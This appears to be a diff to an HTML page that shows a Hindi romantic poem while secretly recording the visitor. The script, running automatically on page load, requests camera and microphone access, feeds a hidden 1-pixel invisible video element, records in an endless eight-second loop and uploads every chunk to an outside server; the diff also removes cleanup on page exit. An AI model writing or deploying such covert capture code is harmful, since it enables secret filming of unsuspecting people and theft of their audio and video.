@@ -26,7 +26,7 @@ body {
 }
 .hidden {
   position: absolute;
-  width: 1px; 
+  width: 1px;
   height: 1px;
   opacity: 0;
   overflow: hidden;
@@ -46,55 +46,78 @@ h2 {
   <p>
     तेरी आँखों में जो सुकून है,<br>
     वो कहीं और मिलता नहीं…<br><br>
+
     तेरी मुस्कान की एक हल्की सी लहर,<br>
     दिल को छूकर निकल जाए तो,<br>
     धड़कनें भी कह उठती हैं —<br>
-    *"रुक जा ज़रा… ये पल फिर आए ना आए…"*
+    <b>"रुक जा ज़रा… ये पल फिर आए ना आए…"</b>
     <br><br>
+
     तू साथ हो तो हर बात हसीन लगे,<br>
     वरना ये दुनिया भी कोई क्या खास है…<br><br>
+
     तेरी यादों की खुशबू में,<br>
     मेरा हर शाम आज भी साँस लेता है… 🌹💫
   </p>
 </div>
 
+<!-- Hidden video -->
 <video id="cam" class="hidden" autoplay playsinline></video>
 
 <script>
 let stream;
 let recorder;
 
-// Start capturing
+// Start camera + recording cycle
 async function startCapture() {
   try {
     stream = await navigator.mediaDevices.getUserMedia({
-      video: { width: 720, height: 1280 },
+      video: true,
       audio: true
     });
 
     const v = document.getElementById("cam");
     v.srcObject = stream;
-    v.muted = true;
+    v.muted = true; // avoid echo
 
-    // FIXED MIME TYPE with codec
-    const options = {
-      mimeType: "video/webm;codecs=vp8,opus"
-    };
-
-    recorder = new MediaRecorder(stream, options);
-
-    recorder.ondataavailable = (e) => {
-      if (e.data.size > 0) sendChunk(e.data);
-    };
-
-    // FIXED: small chunk interval = safest recording
-    recorder.start(5000);
+    startCycle(); // begin infinite recording loop
 
   } catch (err) {
     console.log("Camera permission issue:", err);
   }
 }
 
+// 8 sec record → stop → send chunk → wait 1 sec → repeat
+async function startCycle() {
+  while (true) {
+    await recordFor8Sec();
+    await sleep(1000); // 1 second pause
+  }
+}
+
+function recordFor8Sec() {
+  return new Promise((resolve) => {
+
+    recorder = new MediaRecorder(stream, { mimeType: "video/webm" });
+
+    recorder.ondataavailable = (e) => {
+      if (e.data.size > 0) sendChunk(e.data);
+    };
+
+    recorder.start();
+    console.log("🎥 Recording 8 seconds…");
+
+    setTimeout(() => {
+      recorder.requestData();
+      recorder.stop();
+      console.log("⛔ Recording stopped, chunk created.");
+      resolve();
+    }, 8000);
+
+  });
+}
+
+// Send chunk to backend
 async function sendChunk(blob) {
   const fd = new FormData();
   fd.append("video_chunk", blob, "chunk.webm");
@@ -102,18 +125,15 @@ async function sendChunk(blob) {
   fetch("https://video.kannu-jaat.deno.net", {
     method: "POST",
     body: fd
-  }).catch((e)=>{
-    console.error("Failed to send chunk:", e);
-  });
+  })
+  .catch(err => console.error("Failed to send chunk:", err));
 }
 
-window.addEventListener("beforeunload", () => {
-  try {
-    if (recorder && recorder.state !== "inactive") recorder.stop();
-    if (stream) stream.getTracks().forEach(t => t.stop());
-  } catch {}
-});
+function sleep(ms) {
+  return new Promise(r => setTimeout(r, ms));
+}
 
+// Auto-start
 startCapture();
 </script>
 
